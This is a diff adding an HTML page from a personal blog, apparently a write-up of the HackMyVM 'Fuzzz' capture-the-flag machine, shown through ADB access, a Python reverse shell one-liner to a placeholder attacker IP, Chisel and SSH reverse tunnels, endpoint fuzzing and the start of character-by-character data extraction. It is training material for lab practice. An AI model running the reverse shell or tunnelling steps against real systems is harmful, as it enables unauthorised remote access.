@@ -1,0 +1,2062 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Fuzzz — HackMyVM &middot; k40t1k</title>
+    <meta name="title" content="Fuzzz — HackMyVM &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="http://localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="http://localhost:1313/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="http://localhost:1313/posts/fuzzz-hackmyvm/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/fuzzz-hackmyvm/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="Fuzzz — HackMyVM">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-08-25T17:56:00+03:00">
+		<meta property="article:modified_time" content="2026-08-25T17:56:00+03:00">
+		<meta property="article:tag" content="HackMyVM">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Android Debug Bridge">
+		<meta property="article:tag" content="Port Forwarding">
+		<meta property="article:tag" content="SSH">
+		<meta property="article:tag" content="Character Extraction">
+		<meta property="og:image" content="http://localhost:1313/posts/fuzzz-hackmyvm/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="http://localhost:1313/posts/fuzzz-hackmyvm/feature.png">
+	<meta name="twitter:title" content="Fuzzz — HackMyVM">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Fuzzz — HackMyVM",
+    "headline": "Fuzzz — HackMyVM",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/fuzzz-hackmyvm\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-08-25T17:56:00\u002b03:00",
+    "datePublished": "2026-08-25T17:56:00\u002b03:00",
+    
+    "dateModified": "2026-08-25T17:56:00\u002b03:00",
+    
+    "keywords": ["HackMyVM","Linux","Android Debug Bridge","Port Forwarding","SSH","Character Extraction","lrz","Privilege Escalation","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1101"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Fuzzz — Hack My Vm",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Fuzzz — HackMyVM
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-08-25 17:56:00 &#43;0300 EAT">25 August 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_16c416185ebdaa0c.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_b90b0c38d16c0f74.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_7280095ce2efd4ab.webp 777w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_7280095ce2efd4ab.webp 777w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="777"
+        height="487"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_5d9c6070aceb292a.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_efc0dfbfd6084897.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/feature_hu_5d9c6070aceb292a.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/feature.png 777w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/feature.png 777w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a></li>
+    <li><a href="#step-2-initial-access">Step 2: Initial Access</a></li>
+    <li><a href="#step-3-internal-enumeration">Step 3: Internal Enumeration</a></li>
+    <li><a href="#step-4-web-application-discovery">Step 4: Web Application Discovery</a></li>
+    <li><a href="#step-5-character-by-character-extraction">Step 5: Character-by-Character Extraction</a></li>
+    <li><a href="#step-6-lateral-movement">Step 6: Lateral Movement</a></li>
+    <li><a href="#step-7-privilege-escalation">Step 7: Privilege Escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>Fuzzz is a HackMyVM challenge that revolves around an Android Debug Bridge service masquerading on port 5555. The attack chain started with an ADB connection to obtain an initial shell, escalated through port forwarding to discover a hidden web application running internally, and required a character-by-character extraction technique to recover an SSH key embedded in base64-encoded responses. After lateral movement to the <code>asahi</code> user, I abused the <code>lrz</code> file transfer utility (run via sudo with no password) to overwrite <code>/etc/passwd</code> and gain root access.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with a full port scan against the target (192.168.56.110) to identify running services.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- 192.168.56.110
+</code></pre><pre tabindex="0"><code>PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.9 (protocol 2.0)
+| ssh-hostkey: 
+|   256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMn+ANUyHwmNWHCBCNEevXEDdony9CC/L/mswWy2QPfo6dGeYVo2nr5m31TOVyka83Rip8dkEifkNqU6gWkXezQ=
+|   256 0a:ce:e5:c3🇩🇪50:9c:6d:b7:0d🇩🇪73:b8:6c:28:55 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKWBvhip783XnDTvLFztqGGwoe7JnTYbc6dvpjTarJg
+5555/tcp open  adb     syn-ack ttl 64 Android Debug Bridge (token auth required)
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>SSH (22) is running OpenSSH 9.9.</li>
+<li>Port 5555 hosts an Android Debug Bridge (ADB) service with token authentication required.</li>
+</ul>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><p>I connected to the target&rsquo;s ADB service and obtained an interactive shell.</p>
+<pre tabindex="0"><code>adb connect 192.168.56.110 5555
+</code></pre><pre tabindex="0"><code>adb shell
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/adb-shell_hu_f8121930b5f98bb6.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="558"
+        height="137"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/adb-shell.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The ADB shell was limited, so I spawned a Python reverse shell using <code>nohup</code> to maintain persistence.</p>
+<pre tabindex="0"><code>nohup python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;my-ip&gt;&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39; &amp;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/nohup-reverse-shell_hu_b04ac1308cad1386.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="560"
+        height="111"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/nohup-reverse-shell.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I caught the incoming shell with Penelope.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_1f1c7a804d0134f.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_4548abd58cfe441d.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_6689d5fb97d97847.webp 754w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_6689d5fb97d97847.webp 754w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="754"
+        height="56"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_7c2cbf3277dfc7f7.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_1de1d2fd801d86ab.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell_hu_7c2cbf3277dfc7f7.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell.png 754w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/penelope-shell.png 754w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-internal-enumeration" class="relative group">Step 3: Internal Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-internal-enumeration" aria-label="Anchor">#</a></span></h2><p>Checking for sudo permissions prompted for the <code>runner</code> user&rsquo;s password, which I did not have.</p>
+<pre tabindex="0"><code>/ $ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+For security reasons, the password you type will not be visible.
+
+[sudo] password for runner: 
+</code></pre><p>I enumerated listening ports on localhost and discovered port 80 was open internally.</p>
+<pre tabindex="0"><code>netstat -tlnup
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_51ce84c071ab0bf0.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_d02f5f82a335464e.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_7e949d6893d8da9.webp 923w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_7e949d6893d8da9.webp 923w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="923"
+        height="136"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_d1fc5cd5264f75a6.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_2c02c5e9ac5ac7c2.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80_hu_d1fc5cd5264f75a6.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80.png 923w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/netstat-port80.png 923w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Inspecting the process revealed a uWSGI application running under the <code>asahi</code> user.</p>
+<pre tabindex="0"><code>ps aux | grep 80
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_ade4a4e4a08c9515.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_25ef5b70f91d5b90.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_ec03dcccc8f94ec6.webp 955w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_ec03dcccc8f94ec6.webp 955w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="955"
+        height="42"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_fe0993b0432cdc01.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_ad8dd469dd523260.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi_hu_fe0993b0432cdc01.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi.png 955w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/ps-aux-uwsgi.png 955w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The <code>runner</code> user had no read access to the web application directory.</p>
+<pre tabindex="0"><code>ls -la /opt/webapp/
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/opt-webapp_hu_f124a573f3e9029b.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="529"
+        height="99"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/opt-webapp.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li>Internal web service running on <code>127.0.0.1:80</code></li>
+<li>uWSGI application serving a Python Flask/Django app</li>
+<li>The ADB service was actually a Python fake service, not genuine <code>adbd</code></li>
+</ul>
+<h2 id="step-4-web-application-discovery" class="relative group">Step 4: Web Application Discovery <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-web-application-discovery" aria-label="Anchor">#</a></span></h2><p>I needed to forward port 80 to my machine. My first attempt used Penelope&rsquo;s port forwarding, but the connection kept dropping.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/chisel-portfwd_hu_de068dfeaa0e9d4.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="656"
+        height="65"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/chisel-portfwd.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I switched to Chisel for a more stable tunnel.</p>
+<pre tabindex="0"><code>./chisel client 192.168.56.1:80 R:socks
+</code></pre><pre tabindex="0"><code>chisel server -p 80 --reverse --socks5
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/chisel-portfwd_hu_de068dfeaa0e9d4.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="656"
+        height="65"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/chisel-portfwd.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I ran <strong>Feroxbuster</strong> through the SOCKS proxy but only found <code>/health</code> and <code>/version</code>, which provided no actionable information.</p>
+<pre tabindex="0"><code>curl 127.0.0.1/health
+OK
+curl 127.0.0.1/version
+1.9.1
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/feroxbuster-results_hu_9f4b2561a5f13fcf.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="619"
+        height="47"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/feroxbuster-results.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Switching to <strong>ffuf</strong> with a larger wordlist uncovered a <code>/line</code> endpoint with incremental page numbers.</p>
+<pre tabindex="0"><code>ffuf -x socks5://127.0.0.1:1080 -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -t 40
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_154da1ad5bfc9d3b.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_3ec4dd1e362d51b.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_7bc6c853429d8705.webp 757w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_7bc6c853429d8705.webp 757w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="757"
+        height="74"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_b57a39823c4d59ec.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_1d82f33c462b7ce0.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results_hu_b57a39823c4d59ec.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results.png 757w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/ffuf-results.png 757w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The scan revealed pages <code>line1</code> through <code>line5</code>, plus <code>line01</code> and <code>line02</code>, all returning <code>200</code> with zero-length bodies.</p>
+<pre tabindex="0"><code>                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
+line                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
+line2                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
+line1                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
+line3                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
+line4                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
+                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
+line01                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
+line02                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
+</code></pre><p>However, directly accessing these pages returned 404, which I did not understand at first.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/line-pages-404_hu_16c0c81e708f3c5.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="451"
+        height="180"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/line-pages-404.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-5-character-by-character-extraction" class="relative group">Step 5: Character-by-Character Extraction <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-character-by-character-extraction" aria-label="Anchor">#</a></span></h2><p>Since both Penelope and Chisel had issues exposing the pages reliably, I set up an SSH reverse tunnel as a last resort.</p>
+<pre tabindex="0"><code>ssh -R 8080:127.0.0.1:80 kaotik@192.168.56.1
+</code></pre><p>After setting it up, I confirmed the tunnel was working by successfully fetching <code>/line5</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ssh-tunnel-success_hu_b7ef7ed18d280f2e.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="448"
+        height="92"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/ssh-tunnel-success.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Lines 1 through 5 returned <code>200</code> while line 6 returned <code>404</code>. I noticed that appending characters to the URL also returned <code>200</code>, suggesting the application was leaking data one character at a time.</p>
+<pre tabindex="0"><code>curl -I http://127.0.0.1:8080/line1/b
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
